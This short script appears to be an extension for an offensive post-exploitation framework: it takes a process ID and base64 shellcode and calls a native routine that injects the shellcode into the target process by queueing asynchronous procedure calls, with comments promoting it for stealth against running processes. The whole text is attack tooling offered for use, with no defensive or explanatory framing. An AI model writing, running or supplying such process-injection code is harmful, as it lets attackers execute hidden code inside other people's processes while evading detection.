// Usage: extension load inject_remote_apc <pid> <b64_shellcode>
// Best for: Stealth on running processes (Passive - waits for alertable state)

if args.len() < 2 { return "Usage: <pid> <payload>"; }
print_log("Queueing APCs to PID " + args[0]);
return native_inject_remote_apc(args[0], args[1]);
